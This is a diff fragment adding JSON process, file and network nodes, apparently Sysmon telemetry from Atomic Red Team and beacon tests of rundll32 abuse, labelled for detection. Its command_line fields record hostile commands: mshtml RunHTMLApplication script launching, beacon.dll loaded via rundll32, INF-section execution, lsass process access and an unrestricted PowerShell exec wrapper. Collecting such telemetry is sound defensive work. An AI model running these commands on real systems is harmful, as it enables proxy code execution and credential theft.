+        "command_hash": "19a8736ee1499e17ad4896c9317b036528504470bbe7f114cc2fb4cd29c6767c",
+        "parent_process_id": "Process:{9014E149-0446-5FC5-0B00-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{9014E149-0703-5FC5-D201-000000009101}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe"
+      }
+    },
+    {
+      "id": "Process:{1AADB668-6316-601C-710B-00000000A301}:1",
+      "label": "windows host process (rundll32)",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{1AADB668-6316-601C-710B-00000000A301}",
+        "pid": "5416",
+        "image_path": "c:\\temp\\notrundll32.exe",
+        "command_line": "c:\\temp\\notrundll32.exe",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "8913e55494ea63dea235b184eba3c4e99aa1bef6e3130b41089203cd058ccbe6",
+        "parent_process_id": "Process:{1AADB668-500B-601C-0309-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{1AADB668-6316-601C-710B-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows host process (rundll32)",
+        "name": "windows host process (rundll32)"
+      }
+    },
+    {
+      "id": "Process:{1AADB668-6316-601C-710B-00000000A301}:10",
+      "label": "notrundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "notrundll32.exe",
+        "guid": "{1AADB668-6316-601C-710B-00000000A301}",
+        "pid": "5416",
+        "image_path": "c:\\temp\\notrundll32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1fffff for notrundll32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "3ec727cd48f730ecd23ad073356ecc96e260eb85da96430fb9dfd1dddb399666",
+        "parent_process_id": "Process:{1AADB668-4FDB-601C-CC08-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{1AADB668-6316-601C-710B-00000000A301}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "notrundll32.exe",
+        "name": "notrundll32.exe"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-5543-6021-B175-00000000A301}:1",
+      "label": "taskmgr.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{D700CDCA-5543-6021-B175-00000000A301}",
+        "pid": "7460",
+        "image_path": "%system32%\\taskmgr.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{D700CDCA-5543-6021-B175-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "taskmgr.exe",
+        "name": "taskmgr.exe"
+      }
+    },
+    {
+      "id": "Process:{834264DD-651B-6206-F900-000000002802}:1",
+      "label": "windows calculator",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows calculator",
+        "guid": "{834264DD-651B-6206-F900-000000002802}",
+        "pid": "6760",
+        "image_path": "%system32%\\calc.exe",
+        "command_line": "%system32%\\calc.exe",
+        "original_file_name": "calc.exe",
+        "image_hash": "MD5=2A5CC198FEFC04C2B6B95207A91D3668,SHA256=04FA16D1FBB5F047E7BF9756E8DDC1365AFEAAB22DD4A2C3F03E067B75BED8EA",
+        "command_hash": "ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403",
+        "parent_process_id": "Process:{834264DD-651B-6206-F700-000000002802}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{834264DD-651B-6206-F900-000000002802}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows calculator",
+        "name": "windows calculator"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0703-5FC5-D501-000000009101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{9014E149-0703-5FC5-D501-000000009101}",
+        "pid": "3852",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe setupapi.dll,installhinfsection defaultinstall 128 .\\c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011_defaultinstall.inf <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "c71fa7041d5b858acf3d1a5ce16dc1d64c8dc0352c09b765557b69e56edad9a6",
+        "event_id": "1",
+        "id": "Process:{9014E149-0703-5FC5-D501-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:270f01aac4b93a9ba912504a0af346441a355d0e337da0987ab4d4d04284362a:17",
+      "label": "msse-918-server",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "msse-918-server",
+        "source_image_path": "c:\\temp\\notrundll32.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{D700CDCA-C0FA-6022-CEA1-00000000A301}:1",
+        "event_id": "17",
+        "id": "File:270f01aac4b93a9ba912504a0af346441a355d0e337da0987ab4d4d04284362a:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "msse-918-server",
+        "name": "msse-918-server"
+      }
+    },
+    {
+      "id": "Process:{9014E149-05D6-5FC5-5B01-000000009101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{9014E149-05D6-5FC5-5B01-000000009101}",
+        "pid": "4520",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\mshtml,runhtmlapplication \"+string(createobject(\"wscript.shell\").run(\"calc.exe\"),0) <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "bbdb8d420820ecb2c3152913343beaf52e919773ff8bae28fd4f2d4e19e15604",
+        "event_id": "1",
+        "id": "Process:{9014E149-05D6-5FC5-5B01-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{9014E149-05D6-5FC5-5C01-000000009101}:1",
+      "label": "windows host process (rundll32)",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{9014E149-05D6-5FC5-5C01-000000009101}",
+        "pid": "3668",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "mshtml,runhtmlapplication \"+string(createobject(\"wscript.shell\").run(\"calc.exe\"),0) <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "955bdd2df39804972be3790bdf7c5529b063a3520218dfcfab0cc678e7e7fb84",
+        "parent_process_id": "Process:{9014E149-05D6-5FC5-5B01-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{9014E149-05D6-5FC5-5C01-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows host process (rundll32)",
+        "name": "windows host process (rundll32)"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0702-5FC5-CF01-000000009101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{9014E149-0702-5FC5-CF01-000000009101}",
+        "pid": "4704",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe advpack.dll,launchinfsection c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011.inf,defaultinstall_singleuser,1, <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "543e2f3e38594f03fe155bbe4dc0064fd9daadedb539f05fea95460e1dc052b9",
+        "event_id": "1",
+        "id": "Process:{9014E149-0702-5FC5-CF01-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0702-5FC5-D001-000000009101}:10",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "rundll32.exe",
+        "guid": "{9014E149-0702-5FC5-D001-000000009101}",
+        "pid": "2868",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1478 for rundll32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "9fa7242b47f2b7dc31f3842a93168f5d02a6561efd65a784dfba9ab5e561ffed",
+        "parent_process_id": "Process:{9014E149-0446-5FC5-0B00-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{9014E149-0702-5FC5-D001-000000009101}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0446-5FC5-0B00-000000009101}:1",
+      "label": "lsass.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "local security authority process",
+        "guid": "{9014E149-0446-5FC5-0B00-000000009101}",
+        "pid": "860",
+        "image_path": "%system32%\\lsass.exe",
+        "command_line": "%system32%\\lsass.exe",
+        "original_file_name": "lsass.exe",
+        "image_hash": "MD5=5AE8589CDDE46ED132AEF8280BC8894A,SHA256=D957A03C6EA35CBF0C90B0B088DF07E7803A1A3EEB4BA889038F88DB066BBDC4,IMPHASH=0AA67FE637515AC7535797573607EAA2",
+        "command_hash": "5744d2ba6f9b20f49faec3b0454061b6ce1f2d732837df047479d133523ee1b6",
+        "event_id": "1",
+        "id": "Process:{9014E149-0446-5FC5-0B00-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "lsass.exe",
+        "name": "lsass.exe",
+        "parent_process_id": "Process:{9014E149-0446-5FC5-0700-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C0BF-6022-B6A1-00000000A301}:1",
+      "label": "windows command processor",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{D700CDCA-C0BF-6022-B6A1-00000000A301}",
+        "pid": "4116",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "cmd.exe  \\c c:\\temp\\notrundll32.exe c:\\payloads\\beacon.dll,startw <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "0d85b0b1674a71a29d9f3bd586b542d7d3534e32bd75cee8e63f15e97a1b48d6",
+        "parent_process_id": "Process:{D700CDCA-C0BE-6022-B4A1-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C0BF-6022-B6A1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows command processor",
+        "name": "windows command processor"
+      }
+    },
+    {
+      "id": "Process:{9014E149-04A8-5FC5-DD00-000000009101}:1",
+      "label": "winrshost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "host process for winrm's remote shell plugin",
+        "guid": "{9014E149-04A8-5FC5-DD00-000000009101}",
+        "pid": "4436",
+        "image_path": "%system32%\\winrshost.exe",
+        "command_line": "%system32%\\winrshost.exe -embedding",
+        "original_file_name": "winrshost.exe",
+        "image_hash": "MD5=F40EC96CA18D88CB1F26FA2070010714,SHA256=607C014A3CA531FFAD50BCD90095C01E4E6B691D9E18473C70E4699CF1E31453,IMPHASH=4216D8E7F36901B61DFD6309B49BCF96",
+        "command_hash": "b16d29df420c9110b5a2ed97ef661332ad7e2c63f73bc72fc04213edd5d071aa",
+        "event_id": "1",
+        "id": "Process:{9014E149-04A8-5FC5-DD00-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "winrshost.exe",
+        "name": "winrshost.exe",
+        "parent_process_id": "Process:{9014E149-0448-5FC5-0C00-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0448-5FC5-1200-000000009101}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "host process for windows services",
+        "guid": "{9014E149-0448-5FC5-1200-000000009101}",
+        "pid": "1200",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "%system32%\\svchost.exe -k localservice",
+        "original_file_name": "svchost.exe",
+        "image_hash": "MD5=36F670D89040709013F6A460176767EC,SHA256=438B6CCD84F4DD32D9684ED7D58FD7D1E5A75FE3F3D12AB6C788E6BB0FFAD5E7,IMPHASH=2CED93915677390B76EE1916B92F3EF6",
+        "command_hash": "43efe1f55a8b3625d47dc16b069f9dae68a9c3196f565c6c30e5ad5769e00b19",
+        "event_id": "1",
+        "id": "Process:{9014E149-0448-5FC5-1200-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe",
+        "parent_process_id": "Process:{9014E149-0446-5FC5-0A00-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-BFB8-6022-89A1-00000000A301}:1",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{D700CDCA-BFB8-6022-89A1-00000000A301}",
+        "pid": "7176",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{D700CDCA-BFB8-6022-89A1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe"
+      }
+    },
+    {
+      "id": "network:type:  5 github.map.fastly.net;::ffff:151.101.12.133;::tcp",
+      "label": "type:  5 github.map.fastly.net;::ffff:151.101.12.133;",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "type:  5 github.map.fastly.net;::ffff:151.101.12.133;",
+        "destination_port": "",
+        "protocol": "tcp",
+        "domain_name": "raw.githubusercontent.com",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "parent_process_id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:1",
+        "event_id": "22",
+        "id": "network:type:  5 github.map.fastly.net;::ffff:151.101.12.133;::tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "type:  5 github.map.fastly.net;::ffff:151.101.12.133;",
+        "name": "type:  5 github.map.fastly.net;::ffff:151.101.12.133;"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C071-6022-A5A1-00000000A301}:1",
+      "label": "windows command processor",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{D700CDCA-C071-6022-A5A1-00000000A301}",
+        "pid": "2148",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c %windir%\\system32\\rundll32.exe c:\\payloads\\beacon.dll,start <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "e4080defdb022ab82da7c3dc706fdccf186a36ffeb759f00d070e5f643c24aa6",
+        "parent_process_id": "Process:{D700CDCA-C05C-6022-A3A1-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C071-6022-A5A1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows command processor",
+        "name": "windows command processor"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C0E7-6022-C9A1-00000000A301}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{D700CDCA-C0E7-6022-C9A1-00000000A301}",
+        "pid": "5464",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "cmd.exe  \\c %system32%\\rundll32.exe c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "cedf07c17b21a95023147e96e2fbfa3e5d0744af22e1af7b3e84727ef460e6eb",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C0E7-6022-C9A1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{9014E149-04A8-5FC5-DF00-000000009101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{9014E149-04A8-5FC5-DF00-000000009101}",
+        "pid": "4164",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe \\c powershell -noprofile -noninteractive -executionpolicy unrestricted <decoded_b64: powershell -noprofile -noninteractive -executionpolicy unrestricted <decoded_b64: &chcp.com 65001 > $null\n$exec_wrapper_str = $input | out-string\n$split_parts = $exec_wrapper_str.split(@(\"0000\"), 2, [stringsplitoptions]::removeemptyentries)\nif (-not $split_parts.length -eq 2) { throw \"invalid payload\" }\nset-variable -name json_raw -value $split_parts[1]\n$exec_wrapper = [scriptblock]::create($split_parts[0])\n&$exec_wrapper>> <ps_bypass_flag>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "652ac8c278b2c241d78aad3cabdc0e7628243696c5ff8517d939cfd566d3d1f6",
+        "event_id": "1",
+        "id": "Process:{9014E149-04A8-5FC5-DF00-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{9014E149-04A8-5FC5-DD00-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "network:<private_ip>:80:tcp",
+      "label": "<PRIVATE_IP>",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "<PRIVATE_IP>",
+        "destination_port": "80",
+        "protocol": "tcp",
+        "domain_name": "ip-10-0-1-16.us-west-2.compute.internal",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "parent_process_id": "Process:{D700CDCA-BFB8-6022-89A1-00000000A301}:1",
+        "event_id": "3",
+        "id": "network:<private_ip>:80:tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "<PRIVATE_IP>",
+        "name": "<PRIVATE_IP>"
+      }
+    },
+    {
+      "id": "Process:{834264DD-64E7-6206-E200-000000002802}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{834264DD-64E7-6206-E200-000000002802}",
+        "pid": "6596",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll                                                                                                                                             #2blahblah",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
+        "command_hash": "851b3ef891d5995ad2a6bef02c35f96d967250fa49a66efa9a2e01be2e583809",
+        "event_id": "1",
+        "id": "Process:{834264DD-64E7-6206-E200-000000002802}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{834264DD-64D6-6206-DA00-000000002802}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0703-5FC5-D201-000000009101}:1",
+      "label": "windows host process (rundll32)",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{9014E149-0703-5FC5-D201-000000009101}",
+        "pid": "2576",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "rundll32.exe  ieadvpack.dll,launchinfsection c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011.inf,defaultinstall_singleuser,1, <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "11a1018e0db63ea972f2fb7cac507435cfd1737ea9c5438041b72a9cbe536410",
+        "parent_process_id": "Process:{9014E149-0703-5FC5-D101-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{9014E149-0703-5FC5-D201-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows host process (rundll32)",
+        "name": "windows host process (rundll32)"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-9959-6021-267E-00000000A301}:1",
+      "label": "powershell_ise.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{D700CDCA-9959-6021-267E-00000000A301}",
+        "pid": "6892",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell_ise.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell_ise.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{D700CDCA-9959-6021-267E-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell_ise.exe",
+        "name": "powershell_ise.exe"
+      }
+    },
+    {
+      "id": "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:17",
+      "label": "postex_456a",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "postex_456a",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
+        "event_id": "17",
+        "id": "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "postex_456a",
+        "name": "postex_456a"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0703-5FC5-D601-000000009101}:1",
+      "label": "windows host process (rundll32)",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{9014E149-0703-5FC5-D601-000000009101}",
+        "pid": "3924",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "rundll32.exe  setupapi.dll,installhinfsection defaultinstall 128 .\\c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011_defaultinstall.inf <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "a09c60a0932a311a1b162d3f0a774fc00cbdad3ddd3b6f29bb8b20628db6c7e8",
+        "parent_process_id": "Process:{9014E149-0703-5FC5-D501-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{9014E149-0703-5FC5-D601-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows host process (rundll32)",
+        "name": "windows host process (rundll32)"
+      }
+    },
+    {
+      "id": "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
+      "label": "cryptdll.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\cryptdll.dll",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "content_hash": "MD5=4B31902F1E0B79CE7E46D9877647C1CC,SHA256=8925892119315293C49D09A26191149660934BF1E5D3D023722E90339ADA38AA,IMPHASH=CAB6D6025DF08B0D0BC6259D625E2778",
+        "parent_process_id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
+        "event_id": "7",
+        "id": "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "cryptdll.dll",
+        "name": "cryptdll.dll"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-944A-601D-1600-00000000A301}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{D700CDCA-944A-601D-1600-00000000A301}",
+        "pid": "1544",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{D700CDCA-944A-601D-1600-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe"
+      }
+    },
+    {
+      "id": "Process:{834264DD-64D6-6206-DA00-000000002802}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{834264DD-64D6-6206-DA00-000000002802}",
+        "pid": "796",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{834264DD-64D6-6206-DA00-000000002802}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "File:94ee6edde723d77dfeed0d4f4849760a308fb2f308268f3382eca213f487742b:17",
+      "label": "msse-8558-server",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "msse-8558-server",
+        "source_image_path": "c:\\temp\\notrundll32.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:1",
+        "event_id": "17",
+        "id": "File:94ee6edde723d77dfeed0d4f4849760a308fb2f308268f3382eca213f487742b:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "msse-8558-server",
+        "name": "msse-8558-server"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C0FA-6022-CEA1-00000000A301}:1",
+      "label": "notrundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{D700CDCA-C0FA-6022-CEA1-00000000A301}",
+        "pid": "2836",
+        "image_path": "c:\\temp\\notrundll32.exe",
+        "command_line": "c:\\temp\\notrundll32.exe  c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
